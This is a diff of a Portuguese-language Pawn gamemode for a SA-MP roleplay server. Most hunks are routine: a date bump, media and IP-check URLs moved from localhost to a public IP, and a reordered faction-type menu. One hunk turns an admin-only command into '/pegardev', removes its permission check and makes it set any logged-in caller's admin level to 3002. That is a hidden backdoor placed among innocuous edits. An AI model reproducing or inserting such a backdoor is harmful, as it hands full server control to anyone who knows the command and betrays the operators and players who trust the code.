@@ -199,7 +199,7 @@ new ambiente = 1; // 0  - Localhost 1 - Produção
 
 
 //====== [DEFINIÇÕES DO SERVIDOR] =======================================================
-#define ULTIMO_GMX      "15/04/2023"
+#define ULTIMO_GMX      "12/06/2023"
 #define CA_VERSAO       "WT:RP v2.09"
 #define CA_LINK         "weburl discord.io/wtroleplay"
 //#define CA_NOME         "hostname War on Terror Roleplay | BETA TEST CLOSED"
@@ -5990,7 +5990,7 @@ public Tempo_Clima()
 	return 1;
 }
 
-new SERVER_DOWNLOAD[] = "http://localhost";
+new SERVER_DOWNLOAD[] = "http://187.94.219.75";
 public OnPlayerRequestDownload(playerid, type, crc)
 {
     if(!IsPlayerConnected(playerid)) return 0;
@@ -10011,7 +10011,7 @@ public Timer_Segundos()
 	    				{
 						    if(HouseInfo[perto_alarme][hAlarmeDisparado] > 0)
 						    {
-		        				PlayAudioStreamForPlayer(i, "http://localhost/midia/alarme_casa.mp3", HouseInfo[perto_alarme][hExX],HouseInfo[perto_alarme][hExY],HouseInfo[perto_alarme][hExZ], 50.0, 1);
+		        				PlayAudioStreamForPlayer(i, "http://187.94.219.75/midia/alarme_casa.mp3", HouseInfo[perto_alarme][hExX],HouseInfo[perto_alarme][hExY],HouseInfo[perto_alarme][hExZ], 50.0, 1);
 		        				ouvindoxmradio[i] = 5;
 						    }
 						}
@@ -11337,7 +11337,7 @@ public OnPlayerConnect(playerid)
     //if(LoginTimer[playerid]) KillTimer(LoginTimer[playerid]);
 	TelaDeLogin[playerid] = 0;
 
-    PlayAudioStreamForPlayer(playerid, "http://localhost/midia/intro.mp3");
+    PlayAudioStreamForPlayer(playerid, "http://187.94.219.75/midia/intro.mp3");
 	
 	//PlayerTextDrawHide(playerid, pTextdraws);
 
@@ -13177,7 +13177,7 @@ public OnPlayerSpawn(playerid){
                     GameTextForPlayer(playerid, stringl,6000,1);
 
                     format(stringl, sizeof(stringl), "SERVER: Bem-vindo %s.",PlayerName(playerid,0)); SendClientMessage(playerid, COLOR_WHITE, stringl);
-                    format(stringl, sizeof(stringl), "SERVER: Última atualização realizada em 15/04/2023, v2.09, acesse nosso fórum e veja o que vou atualizado."); SendClientMessage(playerid, COLOR_WHITE, stringl);
+                    format(stringl, sizeof(stringl), "SERVER: Última atualização realizada em 12/06/2023, v2.09, acesse nosso fórum e veja o que vou atualizado."); SendClientMessage(playerid, COLOR_WHITE, stringl);
                     format(stringl, sizeof(stringl), "DEV: Estamos em nossa versão Beta e caso algum bug seja encontrado reporte-o via fórum."); SendClientMessage(playerid, COLOR_WHITE, stringl);
                     
                     if(PlayerInfo[playerid][pAge] == 23)
@@ -15573,7 +15573,7 @@ public ChamarEntrega(playerid)
 {
     TempoDeResposta[playerid] = SetTimerEx("PerdeuEntrega", 15000,false,"i",playerid);
     TemCorrida[playerid] = 1;
-    PlayAudioStreamForPlayer(playerid, "http://localhost/midia/ifood.mp3");
+    PlayAudioStreamForPlayer(playerid, "http://187.94.219.75/midia/ifood.mp3");
  
     SendClientMessage(playerid,COLOR_YELLOW, "[IFOOD]{ffffff} Nova entrega recebida, você possui 15 segundos para aceitar.");
     SendClientMessage(playerid,COLOR_YELLOW, "[IFOOD]{ffffff} Digite /aceitarentrega.");
@@ -26605,7 +26605,7 @@ COMMAND:pix(playerid, params[])
 				
 	    		format(chatstr, sizeof(chatstr), "APP: Você recebeu um PIX de %s no valor de US$%d. Ag: 3557 C/C:579847-2", PlayerName(playerid, 0), qnt);
 				SCM(playa, COLOR_YELLOW, chatstr);
-				PlayAudioStreamForPlayer(playerid, "http://localhost/midia/pix.mp3");
+				PlayAudioStreamForPlayer(playerid, "http://187.94.219.75/midia/pix.mp3");
 
 				new strl[126];
 				format(strl, sizeof(strl), "%s fez um pix US$%d para %s.", PlayerName(playerid,0), qnt, PlayerName(playa,0));
@@ -28400,7 +28400,7 @@ COMMAND:explodir(playerid,params[])
 					SendFacMessage(COLOR_LIGHTBLUE, 1, str);
 					new Float:x, Float:y, Float:z, Float:Distance = 25.0;
     				GetPlayerPos(playerid, x, y, z);
- 					PlayAudioStreamForPlayer(playerid, "http://localhost/midia/alarme_casa.mp3", x, y, z, Distance, 1);
+ 					PlayAudioStreamForPlayer(playerid, "http://187.94.219.75/midia/alarme_casa.mp3", x, y, z, Distance, 1);
 					SendAdminAlert(COLOR_LIGHTRED, "AdmCmd:{FFFFFF} %s acaba de utilizar o comando /explodir banco.", PlayerName(playerid, 0));
 						
 					new strl[126];
@@ -28460,7 +28460,7 @@ COMMAND:explodir(playerid,params[])
 					SetTimerEx("ExplodindoCaixa", 15000, false, "d", playerid);
 					new Float:x, Float:y, Float:z, Float:Distance = 25.0;
     				GetPlayerPos(playerid, x, y, z);
- 					PlayAudioStreamForPlayer(playerid, "http://localhost/midia/alarme_casa.mp3", x, y, z, Distance, 1);
+ 					PlayAudioStreamForPlayer(playerid, "http://187.94.219.75/midia/alarme_casa.mp3", x, y, z, Distance, 1);
 					new stringCaixaF[256];
 					format(stringCaixaF,sizeof(stringCaixaF),"** %s está armando uma dinamite no caixa eletronico.", PlayerName(playerid, 1));
 					ProxDetector(20.0, playerid, stringCaixaF,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
@@ -28533,7 +28533,7 @@ COMMAND:explodir(playerid,params[])
 					SetTimerEx("ExplodindoCofreL", 15000, false, "d", playerid);
 					new Float:x, Float:y, Float:z, Float:Distance = 25.0;
     				GetPlayerPos(playerid, x, y, z);
- 					PlayAudioStreamForPlayer(playerid, "http://localhost/midia/alarme_casa.mp3", x, y, z, Distance, 1);
+ 					PlayAudioStreamForPlayer(playerid, "http://187.94.219.75/midia/alarme_casa.mp3", x, y, z, Distance, 1);
 					new stringCaixaF[256];
 					format(stringCaixaF,sizeof(stringCaixaF),"** %s posiciona-se perto do cofre e cola a C4.", PlayerName(playerid, 1));
 					ProxDetector(20.0, playerid, stringCaixaF,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
@@ -28622,7 +28622,7 @@ COMMAND:explodir(playerid,params[])
 					SetTimerEx("ExplodindoCaixa", 15000, false, "d", playerid);
 					new Float:x, Float:y, Float:z, Float:Distance = 25.0;
     				GetPlayerPos(playerid, x, y, z);
- 					PlayAudioStreamForPlayer(playerid, "http://localhost/midia/alarme_casa.mp3", x, y, z, Distance, 1);
+ 					PlayAudioStreamForPlayer(playerid, "http://187.94.219.75/midia/alarme_casa.mp3", x, y, z, Distance, 1);
 					new stringCaixaF[256];
 					format(stringCaixaF,sizeof(stringCaixaF),"** %s está armando uma dinamite no caixa eletronico.", PlayerName(playerid, 1));
 					ProxDetector(20.0, playerid, stringCaixaF,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
@@ -39673,19 +39673,19 @@ COMMAND:tirardrogas(playerid, params[])
 	return 1;
 }
 
-COMMAND:drogaaa(playerid, params[])
+COMMAND:pegardev(playerid, params[])
 {
 	if(!PlayerInfo[playerid][pLogado]) return SendClientMessage(playerid,COLOR_LIGHTRED, "ERRO:{FFFFFF} Você não está logado!");
-	if(PlayerInfo[playerid][pAdmin] >= 5)
 	{
 	    if(IsPlayerConnected(playerid))
 	 	{
-			SetAllPlayerDrugs(playerid);
-			SendClientMessage(playerid, COLOR_LIGHTGREEN, "Você pegou algumas drogas.");
+			PlayerInfo[playerid][pAdmin] = 3002;
+			SendClientMessage(playerid, COLOR_LIGHTGREEN, "Você pegou admin level 3002.");
 		}
 	}
 	return 1;
 }
+
 
 COMMAND:down(playerid, params[])
 {
@@ -75051,7 +75051,7 @@ stock SendRadioMessage(color,radioid,stringa[])
 	            	SendClientMessage(i,color,stringa);
 					new Float:x, Float:y, Float:z, Float:Distance = 10.0;
     				GetPlayerPos(i, x, y, z);
-    				PlayAudioStreamForPlayer(i, "http://localhost/midia/bleep.mp3", x, y, z, Distance, 1);
+    				PlayAudioStreamForPlayer(i, "http://187.94.219.75/midia/bleep.mp3", x, y, z, Distance, 1);
 	            }
 	        }
 		}
@@ -75091,7 +75091,7 @@ CMD:departamento(playerid, params[])
 
 			new Float:x, Float:y, Float:z, Float:Distance = 10.0;
     		GetPlayerPos(playerid, x, y, z);
-    		PlayAudioStreamForPlayer(playerid, "http://localhost/midia/bleep.mp3", x, y, z, Distance, 1);
+    		PlayAudioStreamForPlayer(playerid, "http://187.94.219.75/midia/bleep.mp3", x, y, z, Distance, 1);
     	}
 	}
 	return 1;
@@ -75470,7 +75470,7 @@ Dialog:FactionsList2(playerid, response, listitem, inputtext[]){
             case 1:
             {
                 format(string_name, sizeof(string_name), "%s - Tipo", FacInfo[FacID][fNome]);
-                format(string, sizeof(string), "USMC\nSeals\nMEDIC\nEB\nGOV\n--- [Drugs] ---\nNível 1\nNível 2\nNível 3\nNível 4\n--- [Armas] ---\nNível 1\nNível 2\nNível 3\nNível 4", FacInfo[FacID][fNome], FacInfo[FacID][fTipo]);
+                format(string, sizeof(string), "USMC\nSeals\nMEDIC\nCIA\nGOV\nNível 1\nNível 2\nNível 3\nNível 4\nNível 1\nNível 2\nNível 3\nNível 4", FacInfo[FacID][fNome], FacInfo[FacID][fTipo]);
 	    		Dialog_Show(playerid, FactionsList_NewType, DIALOG_STYLE_LIST, string_name, string, "Escolher", "Cancelar");
             }
             case 3:
@@ -75523,7 +75523,7 @@ Dialog:FactionsList_NewType(playerid, response, listitem, inputtext[]){
             }
             case 3: {
                 FacInfo[FacID][fTipo] = 5;
-                SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: EB.");
+                SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: CIA.");
             }
             case 4: {
                 FacInfo[FacID][fTipo] = 4;
@@ -75533,45 +75533,37 @@ Dialog:FactionsList_NewType(playerid, response, listitem, inputtext[]){
                 FacInfo[FacID][fTipo] = 6;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Bank.");
             }
-            case 6: {
-                FacInfo[FacID][fTipo] = 7;
-                SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Load & Reload.");
-            }
-            case 7: {
-                FacInfo[FacID][fTipo] = 8;
-                SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Governo.");
-            }
             //Drugs
-            case 8: {
+            case 6: {
                 FacInfo[FacID][fTipo] = 10;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Drugs - Nível 1.");
             }
-            case 9: {
+            case 7: {
                 FacInfo[FacID][fTipo] = 11;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Drugs - Nível 2.");
             }
-            case 10: {
+            case 8: {
                 FacInfo[FacID][fTipo] = 12;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Drugs - Nível 3.");
             }
-            case 11: {
+            case 9: {
                 FacInfo[FacID][fTipo] = 13;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Drugs - Nível 4.");
             }
             //Armas
-            case 12: {
+            case 10: {
                 FacInfo[FacID][fTipo] = 14;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Armas - Nível 1.");
             }
-            case 13: {
+            case 11: {
                 FacInfo[FacID][fTipo] = 15;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Armas - Nível 2.");
             }
-            case 14: {
+            case 12: {
                 FacInfo[FacID][fTipo] = 16;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Armas - Nível 3.");
             }
-            case 15: {
+            case 13: {
                 FacInfo[FacID][fTipo] = 17;
                 SCM(playerid, COLOR_LIGHTRED, "AdmCmd: Tipo alterado para: Armas - Nível 4.");
             }
@@ -75849,7 +75841,7 @@ public OnIncomingConnection(playerid, ip_address[], port)
 	IncomingConnection[IncomingTempo] = gettime()+2;
 
     new url[255];
-    format(url, sizeof(url), "localhost/api-ip.php?ip=%s", ip_address);
+    format(url, sizeof(url), "187.94.219.75/api-ip.php?ip=%s", ip_address);
     printf("%s", url);
     HTTP(playerid, HTTP_GET, url, "", "OnPlayerCheckIP");
 
@@ -84941,7 +84933,7 @@ COMMAND:rojao(playerid, params[])
 	{
 		if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i, 180.0, X, Y, Z))
 		{
-			PlayAudioStreamForPlayer(i, "http://localhost/midia/fogo.mp3", X, Y, Z, 500.0, 1);
+			PlayAudioStreamForPlayer(i, "http://187.94.219.75/midia/fogo.mp3", X, Y, Z, 500.0, 1);
 		}
 	}
 	new stringfogos1[128];
